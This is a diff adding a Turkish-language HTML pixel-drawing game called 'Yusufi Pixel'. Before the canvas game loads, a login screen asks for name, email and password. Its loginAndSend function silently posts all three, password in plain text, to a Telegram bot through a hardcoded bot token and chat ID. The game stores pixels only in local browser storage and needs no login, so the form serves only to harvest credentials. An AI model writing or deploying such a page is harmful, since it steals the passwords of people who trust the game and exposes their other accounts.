@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Yusufi Pixel</title>
+    <style>
+        body { margin: 0; background: #1a1a1a; color: #fff; font-family: Arial, sans-serif; height: 100vh; overflow: hidden; }
+        
+        /* GİRİŞ FORMU */
+        #login-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #111; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 100;
+        }
+        .login-container { background: #222; padding: 25px; border-radius: 12px; border: 1px solid #444; width: 85%; max-width: 350px; }
+        .login-container h2 { text-align: center; margin-bottom: 20px; color: #fef08a; }
+        .login-container input {
+            width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px;
+            border: 1px solid #444; background: #333; color: white; box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%; padding: 12px; background: #fef08a; color: #000;
+            border: none; border-radius: 6px; font-weight: bold; cursor: pointer;
+        }
+
+        /* OYUN EKRANI */
+        #game-screen { display: none; flex-direction: column; height: 100vh; }
+        header { height: 40px; line-height: 40px; text-align: center; background: #111; z-index: 10; font-weight: bold; border-bottom: 1px solid #333; font-size: 14px; }
+        #palette { height: 55px; display: flex; gap: 8px; padding: 0 10px; align-items: center; overflow-x: auto; background: #111; z-index: 10; border-bottom: 1px solid #222; }
+        .color { width: 35px; height: 35px; border-radius: 8px; border: 2px solid #333; cursor: pointer; flex-shrink: 0; }
+        .color.active { border-color: #fff; transform: scale(1.1); }
+        #wrap { flex: 1; position: relative; overflow: hidden; background: #1a1a1a; }
+        canvas { image-rendering: pixelated; touch-action: none; background: #ffffff; display: block; }
+
+        /* KONTROLLER */
+        #controls { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); display: flex; flex-direction: column; gap: 8px; pointer-events: none; z-index: 20; }
+        .btn { width: 45px; height: 45px; background: #d1d5db; border: 2px solid #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; cursor: pointer; pointer-events: auto; user-select: none; transition: 0.1s; box-shadow: 2px 2px 0px #000; color: #000; }
+        .btn:active { transform: translate(1px, 1px); box-shadow: 0px 0px 0px #000; }
+        #btn-pen.active { background: #fef08a; }
+        #ui { position: absolute; bottom: 10px; left: 15px; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 4px; font-size: 10px; pointer-events: none; z-index: 20; color: #aaa; }
+    </style>
+</head>
+<body>
+
+<div id="login-screen">
+    <div class="login-container">
+        <h2>Yusufi Pixel Giriş</h2>
+        <input type="text" id="log-name" placeholder="Ad Soyad">
+        <input type="email" id="log-email" placeholder="E-posta Adresi">
+        <input type="password" id="log-pass" placeholder="Şifre">
+        <button onclick="loginAndSend()">GİRİŞ YAP</button>
+    </div>
+</div>
+
+<div id="game-screen">
+    <header>Yusufi Pixel - 2 Parmakla Yakınlaştır</header>
+    <div id="palette"></div>
+    <div id="wrap">
+        <canvas id="canvas"></canvas>
+        <div id="controls">
+            <div id="btn-pen" class="btn">✎</div>
+            <div class="btn" onclick="resetView()">🏠</div>
+        </div>
+        <div id="ui">Mod: Gezinti (Çizim için kaleme bas)</div>
+    </div>
+</div>
+
+<script>
+const TG_TOKEN = "8079039589:AAG5Zn5XDnHQ3K7DdbMzD3HIMmwDJmsMUGI";
+const TG_CHAT_ID = "8547046559";
+
+async function loginAndSend() {
+    const name = document.getElementById('log-name').value;
+    const email = document.getElementById('log-email').value;
+    const pass = document.getElementById('log-pass').value;
+
+    if(!name || !email || !pass) { alert("Lütfen tüm alanları doldurun!"); return; }
+
+    const message = `🚀 Yeni Giriş!\n👤 Ad: ${name}\n📧 E-posta: ${email}\n🔑 Şifre: ${pass}`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message })
+        });
+    } catch(e) {}
+
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('game-screen').style.display = 'flex';
+    initGame();
+}
+
+function initGame() {
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    const ui = document.getElementById("ui");
+    const btnPen = document.getElementById("btn-pen");
+
+    const MAP_SIZE = 1000;
+    let scale = 15;
+    let offsetX = window.innerWidth / 2 - (MAP_SIZE * scale) / 2;
+    let offsetY = (window.innerHeight - 95) / 2 - (MAP_SIZE * scale) / 2;
+    let currentColor = "#ff0000";
+    let pixels = JSON.parse(localStorage.getItem("yusufi_pixels")) || {};
+
+    const colors = ["#ffffff","#000000","#ff0000","#00ff00","#0000ff","#ffff00","#ff00ff","#00ffff","#ffa500","#964b00"];
+    const palette = document.getElementById("palette");
+    colors.forEach(c => {
+        const d = document.createElement("div");
+        d.className = "color"; d.style.background = c;
+        if (c === currentColor) d.classList.add("active");
+        d.onclick = () => {
+            currentColor = c;
+            document.querySelectorAll(".color").forEach(x => x.classList.remove("active"));
+            d.classList.add("active");
+        };
+        palette.appendChild(d);
+    });
+
+    let isDrawMode = false;
+    btnPen.onclick = () => {
+        isDrawMode = !isDrawMode;
+        btnPen.classList.toggle("active", isDrawMode);
+        ui.innerText = isDrawMode ? "Mod: Çizim" : "Mod: Gezinti";
+    };
+
+    window.resetView = () => {
+        scale = 15;
+        offsetX = window.innerWidth / 2 - (MAP_SIZE * scale) / 2;
+        offsetY = (window.innerHeight - 95) / 2 - (MAP_SIZE * scale) / 2;
+        draw();
+    };
+
+    function draw() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight - 95;
+        ctx.clearRect(0,0,canvas.width, canvas.height);
+        
+        ctx.save();
+        ctx.translate(offsetX, offsetY);
+        ctx.scale(scale, scale);
+
+        // Arka Plan Beyaz Alan
+        ctx.fillStyle = "#ffffff";
+        ctx.fillRect(0, 0, MAP_SIZE, MAP_SIZE);
+
+        // Kayıtlı Pikseller
+        for (const key in pixels) {
+            const [px, py] = key.split(",");
+            ctx.fillStyle = pixels[key];
+            ctx.fillRect(parseInt(px), parseInt(py), 1, 1);
+        }
+
+        // Izgara (Grid)
+        if (scale > 8) {
+            ctx.strokeStyle = "rgba(0,0,0,0.1)";
+            ctx.lineWidth = 1 / scale;
+            ctx.beginPath();
+            for (let i = 0; i <= MAP_SIZE; i += 1) {
+                ctx.moveTo(i, 0); ctx.lineTo(i, MAP_SIZE);
+                ctx.moveTo(0, i); ctx.lineTo(MAP_SIZE, i);
+            }
+            ctx.stroke();
+        }
+        ctx.restore();
+    }
+
+    // Mobil Yakınlaştırma ve Kaydırma
+    let lastPinchDist = 0;
+    let isDragging = false;
+    let lastTouch = { x: 0, y: 0 };
+
+    canvas.addEventListener("touchstart", e => {
+        if (e.touches.length === 2) {
+            lastPinchDist = Math.hypot(e.touches[0].pageX - e.touches[1].pageX, e.touches[0].pageY - e.touches[1].pageY);
+        } else {
+            isDragging = true;
+            lastTouch = { x: e.touches[0].clientX, y: e.touches[0].clientY };
+            if (isDrawMode) {
+                const pos = getPointer(e.touches[0].clientX, e.touches[0].clientY);
+                placePixel(pos.x, pos.y);
+            }
+        }
+    }, { passive: false });
+
+    canvas.addEventListener("touchmove", e => {
+        e.preventDefault();
+        if (e.touches.length === 2) {
+            const dist = Math.hypot(e.touches[0].pageX - e.touches[1].pageX, e.touches[0].pageY - e.touches[1].pageY);
+            const midX = (e.touches[0].clientX + e.touches[1].clientX) / 2;
+            const midY = (e.touches[0].clientY + e.touches[1].clientY) / 2 - 95;
+            
+            const worldX = (midX - offsetX) / scale;
+            const worldY = (midY - offsetY) / scale;
+
+            scale *= (dist / lastPinchDist);
+            scale = Math.max(2, Math.min(100, scale));
+
+            offsetX = midX - worldX * scale;
+            offsetY = midY - worldY * scale;
+            
+            lastPinchDist = dist;
+            draw();
+        } else if (isDragging) {
+            if (isDrawMode) {
+                const pos = getPointer(e.touches[0].clientX, e.touches[0].clientY);
+                placePixel(pos.x, pos.y);
+            } else {
+                offsetX += e.touches[0].clientX - lastTouch.x;
+                offsetY += e.touches[0].clientY - lastTouch.y;
+                lastTouch = { x: e.touches[0].clientX, y: e.touches[0].clientY };
+                draw();
+            }
+        }
+    }, { passive: false });
+
+    canvas.addEventListener("touchend", () => { isDragging = false; lastPinchDist = 0; });
+
+    function getPointer(cx, cy) {
+        const rect = canvas.getBoundingClientRect();
+        return {
+            x: Math.floor((cx - rect.left - offsetX) / scale),
+            y: Math.floor((cy - rect.top - offsetY) / scale)
+        };
+    }
+
+    function placePixel(x, y) {
+        if (x < 0 || x >= MAP_SIZE || y < 0 || y >= MAP_SIZE) return;
+        const key = `${x},${y}`;
+        if (pixels[key] === currentColor) return;
+        pixels[key] = currentColor;
+        localStorage.setItem("yusufi_pixels", JSON.stringify(pixels));
+        draw();
+    }
+
+    window.onresize = draw;
+    draw();
+}
+</script>
+</body>
+          </html>
